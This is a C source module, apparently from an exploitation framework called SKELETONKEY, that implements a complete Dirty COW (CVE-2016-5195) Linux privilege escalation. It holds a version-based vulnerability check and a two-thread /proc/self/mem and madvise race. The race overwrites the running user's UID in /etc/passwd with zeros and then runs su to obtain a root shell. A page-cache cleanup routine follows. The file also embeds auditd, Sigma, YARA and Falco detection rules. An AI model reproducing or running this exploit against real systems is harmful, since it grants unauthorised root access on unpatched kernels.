/*
 * dirty_cow_cve_2016_5195 — SKELETONKEY module
 *
 * The iconic CVE-2016-5195. COW race in get_user_pages() / fault
 * handling: a thread writing to /proc/self/mem races a thread calling
 * madvise(MADV_DONTNEED) on the same mapping. The bug lets the write
 * land in the file's page cache when it should have triggered a
 * copy-on-write into anonymous memory.
 *
 * Discovered by Phil Oester (Oct 2016). Mainline fix
 * 19be0eaffa3a "mm: remove gup_flags FOLL_WRITE games from
 * __get_user_pages()" (Oct 19 2016).
 *
 * STATUS: 🟢 FULL detect + exploit + cleanup.
 *
 * Coverage rationale: this is what "old systems" means. RHEL 6 (3.10),
 * RHEL 7 (3.10 early), Ubuntu 14.04 (3.13), Ubuntu 16.04 (4.4), embedded
 * Linux distros, IoT devices — many still in production with kernels
 * predating the fix. The exploit is universal (POSIX threads, no
 * arch-specific bits).
 *
 * Affected: kernel 2.6.22 through 4.8.x without backport. Mainline
 * fixed at 4.9. Stable backports landed in:
 *   4.8.x : K >= 4.8.3
 *   4.7.x : K >= 4.7.10
 *   4.4.x : K >= 4.4.26   (LTS)
 *   3.18.x: K >= 3.18.43  (LTS)
 *   3.16.x: K >= 3.16.38
 *   3.12.x: K >= 3.12.66  (LTS)
 *   3.10.x: K >= 3.10.104 (LTS — what RHEL 7 ships)
 *   3.2.x : K >= 3.2.84
 *
 * Exploit shape: Phil Oester-style two-thread race.
 *   - mmap /etc/passwd PRIVATE (writes go to copy-on-write)
 *   - Find the user's UID field byte offset
 *   - Thread A loop: pwrite(/proc/self/mem, "0000", uid_off) — should
 *     write to the COW page, but the bug makes it land in the original
 *   - Thread B loop: madvise(addr, MADV_DONTNEED) — drops the COW
 *     copy, forcing re-fault
 *   - One iteration wins the race → page cache poisoned
 *   - execve(su) → shell with uid=0
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#ifdef __linux__

#include "../../core/kernel_range.h"
#include "../../core/host.h"
#include <stdint.h>
#include <stdatomic.h>
#include <fcntl.h>
#include <errno.h>
#include <pwd.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>

/* Stable-branch backport thresholds for Dirty COW. */
static const struct kernel_patched_from dirty_cow_patched_branches[] = {
    {2,  6, 999},   /* placeholder — 2.6.x always vulnerable */
    {3,  2,  84},
    {3, 10, 104},   /* RHEL 7 baseline */
    {3, 12,  66},
    {3, 16,  38},
    {3, 18,  43},
    {4,  4,  26},   /* Ubuntu 16.04 baseline */
    {4,  7,   8},   /* Debian tracker: earlier than 4.7.10 */
    {4,  8,   3},
    {4,  9,   0},   /* mainline fix */
};

static const struct kernel_range dirty_cow_range = {
    .patched_from = dirty_cow_patched_branches,
    .n_patched_from = sizeof(dirty_cow_patched_branches) /
                      sizeof(dirty_cow_patched_branches[0]),
};

/* ---- Find UID field offset (inline; same pattern as dirty_pipe) ---- */

static bool find_passwd_uid_field(const char *username,
                                  off_t *uid_off, size_t *uid_len,
                                  char uid_str[16])
{
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) return false;
    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return false; }
    char *buf = malloc(st.st_size + 1);
    if (!buf) { close(fd); return false; }
    ssize_t r = read(fd, buf, st.st_size);
    close(fd);
    if (r != st.st_size) { free(buf); return false; }
    buf[st.st_size] = 0;

    size_t ulen = strlen(username);
    char *p = buf;
    while (p < buf + st.st_size) {
        char *eol = strchr(p, '\n');
        if (!eol) eol = buf + st.st_size;
        if (strncmp(p, username, ulen) == 0 && p[ulen] == ':') {
            char *q = p + ulen + 1;
            char *pw_end = memchr(q, ':', eol - q);
            if (!pw_end) goto next;
            char *uid_begin = pw_end + 1;
            char *uid_end = memchr(uid_begin, ':', eol - uid_begin);
            if (!uid_end) goto next;
            size_t L = uid_end - uid_begin;
            if (L == 0 || L >= 16) goto next;
            memcpy(uid_str, uid_begin, L);
            uid_str[L] = 0;
            *uid_off = (off_t)(uid_begin - buf);
            *uid_len = L;
            free(buf);
            return true;
        }
    next:
        p = eol + 1;
    }
    free(buf);
    return false;
}

/* ---- Phil-Oester-style Dirty COW primitive ---- */

struct dcow_args {
    void *map;             /* mmap'd /etc/passwd */
    off_t offset;          /* offset within the mapping to overwrite */
    const char *payload;
    size_t payload_len;
    int proc_self_mem_fd;
};

static _Atomic int g_dcow_running;

static void *dcow_writer_thread(void *arg)
{
    struct dcow_args *a = (struct dcow_args *)arg;
    while (atomic_load(&g_dcow_running)) {
        if (lseek(a->proc_self_mem_fd,
                  (off_t)((uintptr_t)a->map + a->offset), SEEK_SET) == (off_t)-1) {
            continue;
        }
        (void)write(a->proc_self_mem_fd, a->payload, a->payload_len);
    }
    return NULL;
}

static void *dcow_madvise_thread(void *arg)
{
    struct dcow_args *a = (struct dcow_args *)arg;
    while (atomic_load(&g_dcow_running)) {
        madvise(a->map, 4096, MADV_DONTNEED);
    }
    return NULL;
}

/* Returns 0 on success — payload was observed in /etc/passwd's page
 * cache. Returns -1 on failure / timeout. */
static int dirty_cow_write(off_t uid_off, const char *payload, size_t payload_len)
{
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) return -1;
    struct stat st;
    if (fstat(fd, &st) < 0) { close(fd); return -1; }
    void *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) { close(fd); return -1; }
    close(fd);

    int mem_fd = open("/proc/self/mem", O_RDWR);
    if (mem_fd < 0) { munmap(map, st.st_size); return -1; }

    struct dcow_args args = {
        .map = map,
        .offset = uid_off,
        .payload = payload,
        .payload_len = payload_len,
        .proc_self_mem_fd = mem_fd,
    };

    atomic_store(&g_dcow_running, 1);
    pthread_t w_thr, m_thr;
    pthread_create(&w_thr, NULL, dcow_writer_thread, &args);
    pthread_create(&m_thr, NULL, dcow_madvise_thread, &args);

    /* Race for up to ~3 seconds. On vulnerable kernels this usually
     * wins in milliseconds. */
    int success = -1;
    for (int i = 0; i < 300 && success < 0; i++) {
        usleep(10000);   /* 10ms */
        /* Re-read /etc/passwd via syscall and check if payload landed. */
        int rfd = open("/etc/passwd", O_RDONLY);
        if (rfd >= 0) {
            char readback[16];
            if (pread(rfd, readback, payload_len, uid_off) == (ssize_t)payload_len) {
                if (memcmp(readback, payload, payload_len) == 0) success = 0;
            }
            close(rfd);
        }
    }
    atomic_store(&g_dcow_running, 0);
    pthread_join(w_thr, NULL);
    pthread_join(m_thr, NULL);

    close(mem_fd);
    munmap(map, st.st_size);
    return success;
}

static void revert_passwd_page_cache(void)
{
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd >= 0) {
        posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
        close(fd);
    }
    int dc = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (dc >= 0) {
        if (write(dc, "3\n", 2) < 0) { /* ignore */ }
        close(dc);
    }
}

/* ---- skeletonkey interface ---- */

static skeletonkey_result_t dirty_cow_detect(const struct skeletonkey_ctx *ctx)
{
    /* Consult the shared host fingerprint instead of calling
     * kernel_version_current() ourselves — populated once at startup
     * and identical across every module's detect(). */
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json)
            fprintf(stderr, "[!] dirty_cow: host fingerprint missing kernel "
                "version — bailing\n");
        return SKELETONKEY_TEST_ERROR;
    }

    bool patched = kernel_range_is_patched(&dirty_cow_range, v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] dirty_cow: kernel %s is patched\n", v->release);
        }
        return SKELETONKEY_OK;
    }
    if (!ctx->json) {
        fprintf(stderr, "[!] dirty_cow: kernel %s is in the vulnerable range\n",
                v->release);
        fprintf(stderr, "[i] dirty_cow: --exploit will race a write to "
                        "/etc/passwd via /proc/self/mem\n");
    }
    return SKELETONKEY_VULNERABLE;
}

static skeletonkey_result_t dirty_cow_exploit(const struct skeletonkey_ctx *ctx)
{
    skeletonkey_result_t pre = dirty_cow_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] dirty_cow: detect() says not vulnerable; refusing\n");
        return pre;
    }

    /* Consult ctx->host->is_root so unit tests can construct a
     * non-root fingerprint regardless of the test process's real euid. */
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] dirty_cow: already root — nothing to escalate\n");
        return SKELETONKEY_OK;
    }

    struct passwd *pw = getpwuid(geteuid());
    if (!pw) {
        fprintf(stderr, "[-] dirty_cow: getpwuid failed: %s\n", strerror(errno));
        return SKELETONKEY_TEST_ERROR;
    }

    off_t uid_off;
    size_t uid_len;
    char orig_uid[16] = {0};
    if (!find_passwd_uid_field(pw->pw_name, &uid_off, &uid_len, orig_uid)) {
        fprintf(stderr, "[-] dirty_cow: could not locate '%s' UID field in /etc/passwd\n",
                pw->pw_name);
        return SKELETONKEY_TEST_ERROR;
    }
    if (!ctx->json) {
        fprintf(stderr, "[*] dirty_cow: user '%s' UID '%s' at offset %lld (len %zu)\n",
                pw->pw_name, orig_uid, (long long)uid_off, uid_len);
    }

    char replacement[16];
    memset(replacement, '0', uid_len);
    replacement[uid_len] = 0;

    if (!ctx->json) {
        fprintf(stderr, "[*] dirty_cow: racing UID '%s' → '%s' via Dirty COW primitive\n",
                orig_uid, replacement);
    }
    if (dirty_cow_write(uid_off, replacement, uid_len) < 0) {
        fprintf(stderr, "[-] dirty_cow: race did not win within timeout\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    if (ctx->no_shell) {
        fprintf(stderr, "[+] dirty_cow: --no-shell — patch landed; not spawning su\n");
        return SKELETONKEY_EXPLOIT_OK;
    }

    fprintf(stderr, "[+] dirty_cow: race won; spawning su to claim root\n");
    fflush(NULL);
    execlp("su", "su", pw->pw_name, "-c", "/bin/sh", (char *)NULL);
    perror("execlp(su)");
    revert_passwd_page_cache();
    return SKELETONKEY_EXPLOIT_FAIL;
}

static skeletonkey_result_t dirty_cow_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    if (!ctx->json) {
        fprintf(stderr, "[*] dirty_cow: evicting /etc/passwd from page cache\n");
    }
    revert_passwd_page_cache();
    return SKELETONKEY_OK;
}

#else  /* !__linux__ */

/* Non-Linux dev builds: the Dirty COW primitive (writer thread via
 * /proc/self/mem + madvise(MADV_DONTNEED)) is Linux-only kernel
 * surface. Stub out cleanly so the module still registers and
 * `--list` / `--detect-rules` work on macOS/BSD dev boxes — and so
 * the top-level `make` actually completes there. */
static skeletonkey_result_t dirty_cow_detect(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json)
        fprintf(stderr, "[i] dirty_cow: Linux-only module "
                "(/proc/self/mem + madvise race) — not applicable here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t dirty_cow_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] dirty_cow: Linux-only module — cannot run here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t dirty_cow_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    return SKELETONKEY_OK;
}

#endif /* __linux__ */

/* ---- Embedded detection rules ---- */

static const char dirty_cow_auditd[] =
    "# Dirty COW (CVE-2016-5195) — auditd detection rules\n"
    "# Flag opens of /proc/self/mem from non-root (the exploit's primitive).\n"
    "# False-positive surface: debuggers, gdb, strace — all legit users of\n"
    "# /proc/self/mem. Combine with the file watches below to triangulate.\n"
    "-w /proc/self/mem -p wa -k skeletonkey-dirty-cow\n"
    "-w /etc/passwd    -p wa -k skeletonkey-dirty-cow\n"
    "-w /etc/shadow    -p wa -k skeletonkey-dirty-cow\n"
    "-a always,exit -F arch=b64 -S madvise -F a2=0x4 -k skeletonkey-dirty-cow-madv\n";

static const char dirty_cow_sigma[] =
    "title: Possible Dirty COW exploitation (CVE-2016-5195)\n"
    "id: 1e2c5d8f-skeletonkey-dirty-cow\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects opens of /proc/self/mem followed by madvise(MADV_DONTNEED)\n"
    "  by non-root processes (the exploit's two-thread primitive). False\n"
    "  positives: GDB, strace, some JIT debuggers. Correlate with a\n"
    "  subsequent UID change on a previously-non-root process for high\n"
    "  confidence.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  mem_open:\n"
    "    type: 'PATH'\n"
    "    name: '/proc/self/mem'\n"
    "  not_root: {auid|expression: '!= 0'}\n"
    "  condition: mem_open and not_root\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2016.5195]\n";

static const char dirty_cow_yara[] =
    "rule dirty_cow_cve_2016_5195 : cve_2016_5195 page_cache_write\n"
    "{\n"
    "    meta:\n"
    "        cve         = \"CVE-2016-5195\"\n"
    "        description = \"Dirty COW /etc/passwd UID-flip pattern (non-root user remapped to 0000+)\"\n"
    "        author      = \"SKELETONKEY\"\n"
    "    strings:\n"
    "        $uid_flip = /\\n[a-z_][a-z0-9_-]{0,30}:[^:]{0,8}:0{4,}:[0-9]+:/\n"
    "    condition:\n"
    "        $uid_flip\n"
    "}\n";

static const char dirty_cow_falco[] =
    "- rule: Dirty COW pwrite on /proc/self/mem by non-root\n"
    "  desc: |\n"
    "    Non-root pwrite() targeting /proc/self/mem at an offset that\n"
    "    overlaps a private mmap of /etc/passwd. Combined with a\n"
    "    racing madvise(MADV_DONTNEED) loop this is the Dirty COW\n"
    "    primitive (CVE-2016-5195).\n"
    "  condition: >\n"
    "    evt.type = pwrite and fd.name = /proc/self/mem and\n"
    "    not user.uid = 0\n"
    "  output: >\n"
    "    pwrite to /proc/self/mem by non-root\n"
    "    (user=%user.name proc=%proc.name pid=%proc.pid)\n"
    "  priority: CRITICAL\n"
    "  tags: [filesystem, mitre_privilege_escalation, T1068, cve.2016.5195]\n";

const struct skeletonkey_module dirty_cow_module = {
    .name           = "dirty_cow",
    .cve            = "CVE-2016-5195",
    .summary        = "COW race via /proc/self/mem + madvise → page-cache write (the iconic 2016 LPE)",
    .family         = "dirty_cow",
    .kernel_range   = "2.6.22 ≤ K, fixed mainline 4.9; many LTS backports (RHEL 7 / Ubuntu 14.04 / Ubuntu 16.04 era)",
    .detect         = dirty_cow_detect,
    .exploit        = dirty_cow_exploit,
    .mitigate       = NULL,    /* mitigation: upgrade kernel; no easy runtime knob */
    .cleanup        = dirty_cow_cleanup,
    .detect_auditd  = dirty_cow_auditd,
    .detect_sigma   = dirty_cow_sigma,
    .detect_yara    = dirty_cow_yara,
    .detect_falco   = dirty_cow_falco,
    .opsec_notes    = "Two-thread race: Thread A loops pwrite(/proc/self/mem) at the user's UID offset in /etc/passwd; Thread B loops madvise(MADV_DONTNEED) on a PRIVATE mmap of /etc/passwd. Overwrites the UID field with all-zeros, then execlp('su') to claim root. UID offset is parsed from the file, not hardcoded. Audit-visible via open(/proc/self/mem) + write + madvise(MADV_DONTNEED) bursts + /etc/passwd page-cache poisoning. Cleanup callback calls posix_fadvise(POSIX_FADV_DONTNEED) on /etc/passwd and writes 3 to /proc/sys/vm/drop_caches to evict.",
    .arch_support   = "x86_64+unverified-arm64",
};

void skeletonkey_register_dirty_cow(void)
{
    skeletonkey_register(&dirty_cow_module);
}
